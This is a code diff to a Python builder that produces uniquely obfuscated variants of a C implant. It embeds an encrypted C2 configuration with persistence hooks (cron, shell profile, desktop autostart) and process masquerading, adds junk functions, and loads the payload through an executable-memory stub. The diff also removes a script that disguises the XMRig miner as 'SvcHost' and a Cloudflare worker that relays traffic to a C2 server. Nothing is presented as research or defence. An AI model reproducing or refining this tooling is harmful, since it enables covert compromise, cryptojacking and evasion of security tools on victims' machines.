@@ -9,7 +9,7 @@ from pathlib import Path
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 PHANTOM_SRC  = Path("phantom.c")
-CC           = os.environ.get("CC", "musl-gcc")
+CC           = os.environ.get("CC", "gcc")
 STRIP        = "strip"
 OPT_LEVELS   = ["-O1", "-O2", "-O3", "-Os"]
 
@@ -58,7 +58,7 @@ class MutationEngine:
         self.source = PHANTOM_SRC.read_text()
         self.build_key = os.urandom(32)
         self.build_iv  = os.urandom(16)
-        self.cert_fp   = b'\\x00' * 32
+        self.cert_fp   = b'\x00' * 32
         if cert_der_path:
             with open(cert_der_path, 'rb') as f:
                 self.cert_fp = hashlib.sha256(f.read()).digest()
@@ -72,20 +72,20 @@ class MutationEngine:
     def _serialize_config(self) -> bytes:
         """Pack config struct in exact C memory layout (no padding assumed)."""
         c = self.config
-        buf  = c['c2_url'].encode().ljust(256, b'\\x00')
-        buf += c['c2_fallback_dns'].encode().ljust(128, b'\\x00')
-        buf += c['c2_fallback_paste'].encode().ljust(256, b'\\x00')
-        buf += c['proc_name'].encode().ljust(16, b'\\x00')
-        buf += c['proc_cmdline'].encode().ljust(256, b'\\x00')
-        buf += c['cron_entry'].encode().ljust(512, b'\\x00')
-        buf += c['profile_hook'].encode().ljust(512, b'\\x00')
-        buf += c['xdg_desktop'].encode().ljust(1024, b'\\x00')
-        buf += c['agent_id'].encode().ljust(65, b'\\x00')
+        buf  = c['c2_url'].encode().ljust(256, b'\x00')
+        buf += c['c2_fallback_dns'].encode().ljust(128, b'\x00')
+        buf += c['c2_fallback_paste'].encode().ljust(256, b'\x00')
+        buf += c['proc_name'].encode().ljust(16, b'\x00')
+        buf += c['proc_cmdline'].encode().ljust(256, b'\x00')
+        buf += c['cron_entry'].encode().ljust(512, b'\x00')
+        buf += c['profile_hook'].encode().ljust(512, b'\x00')
+        buf += c['xdg_desktop'].encode().ljust(1024, b'\x00')
+        buf += c['agent_id'].encode().ljust(65, b'\x00')
         buf += struct.pack('<I', c['beacon_base_sec'])
         buf += struct.pack('<f', c['beacon_jitter'])
         buf += struct.pack('<H', c['tunnel_port'])
         buf += struct.pack('<B', c['max_cpu_pct'])
-        buf += b'\\x00' * 512  # self_path (populated at runtime)
+        buf += b'\x00' * 512  # self_path (populated at runtime)
         return buf
 
     def _bytes_to_c_array(self, data: bytes) -> str:
@@ -94,7 +94,7 @@ class MutationEngine:
             chunk = data[i:i+16]
             hexvals = ', '.join(f'0x{b:02X}' for b in chunk)
             lines.append(f'    {hexvals}')
-        return '{\\n' + ',\\n'.join(lines) + '\\n}'
+        return '{\n' + ',\n'.join(lines) + '\n}'
 
     def inject_encrypted_config(self):
         """Replace MORPH_* markers with build-unique encrypted values."""
@@ -131,10 +131,10 @@ static int __attribute__((used)) {name}(void) {{
         marker = 'static struct phantom_cfg G;'
         idx = self.source.find(marker)
         if idx >= 0:
-            insert_at = self.source.index('\\n', idx) + 1
+            insert_at = self.source.index('\n', idx) + 1
             random.shuffle(dead_fns)
             self.source = (self.source[:insert_at]
-                         + '\\n'.join(dead_fns)
+                         + '\n'.join(dead_fns)
                          + self.source[insert_at:])
 
     def substitute_patterns(self):
@@ -180,7 +180,7 @@ static int __attribute__((used)) {name}(void) {{
         obj_path = src_path.replace('.c', '')
 
         compile_cmd = [
-            CC, opt, '-static', '-s', '-fPIE', '-pie',
+            CC, opt, '-s', '-fPIE', '-pie',
             '-ffunction-sections', '-fdata-sections',
             '-Wl,--gc-sections',
             '-DNDEBUG',
@@ -208,8 +208,7 @@ static int __attribute__((used)) {name}(void) {{
 
         stub_obj = stub_path.replace('.c', '')
         subprocess.check_call([
-            CC, '-Os', '-static', '-nostartfiles', '-s',
-            '-fPIE', '-pie',
+            CC, '-Os', '-s', '-fPIE', '-pie',
             '-o', stub_obj, stub_path,
         ])
         subprocess.check_call([STRIP, '--strip-all', stub_obj])
@@ -268,7 +267,7 @@ static void xrc4(uint8_t *d, size_t dl, const uint8_t *k, size_t kl) {{
     }}
 }}
 
-void _start(void) {{
+int main(void) {{
     uint8_t *buf = (uint8_t *)syscall(SYS_mmap, 0, PD_LEN,
         0x7, 0x22, -1, 0);  /* PROT_RWX, MAP_PRIVATE|MAP_ANON */
     for (size_t i = 0; i < PD_LEN; i++) buf[i] = PD[i];
@@ -318,46 +317,3 @@ if __name__ == '__main__':
 
     engine = MutationEngine(agent_config, cert_der_path='c2_cert.der')
     engine.generate(sys.argv[1] if len(sys.argv) > 1 else 'agent_out')
-    
-git clone https://github.com/xmrig/xmrig.git && cd xmrig
-
-# Strip all identifiable strings
-sed -i 's/XMRig/SvcHost/g' src/version.h
-sed -i 's/xmrig\.com/localhost/g' src/donate.h
-sed -i 's/kDefaultDonateLevel = 1/kDefaultDonateLevel = 0/' src/donate.h
-sed -i 's/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/' src/donate.h
-
-# Randomize the internal user-agent
-UA=$(head -c 16 /dev/urandom | xxd -p)
-sed -i "s/\"XMRig\/[^\"]*\"/\"Mozilla\/$UA\"/" src/base/net/stratum/Client.cpp
-
-# Compile static, stripped, with randomized optimization
-mkdir build && cd build
-cmake .. -DWITH_TLS=OFF -DWITH_HTTPD=OFF \
-         -DCMAKE_C_FLAGS="-O2 -ffunction-sections -fdata-sections" \
-         -DCMAKE_EXE_LINKER_FLAGS="-static -Wl,--gc-sections"
-make -j$(nproc)
-strip --strip-all xmrig
-
-sha256sum xmrig
-addEventListener('fetch', event => {
-  event.respondWith(handleRelay(event.request))
-})
-
-const C2_ORIGIN = 'https://real-c2-server.example.com'
-
-async function handleRelay(request) {
-  const targetURL = new URL(request.url)
-  targetURL.hostname = new URL(C2_ORIGIN).hostname
-  targetURL.protocol = 'https:'
-
-  const proxyReq = new Request(targetURL.toString(), {
-    method:  request.method,
-    headers: request.headers,
-    body:    request.body,
-  })
-
-  proxyReq.headers.set('X-Forwarded-For', request.headers.get('CF-Connecting-IP'))
-
-  return fetch(proxyReq)
-}
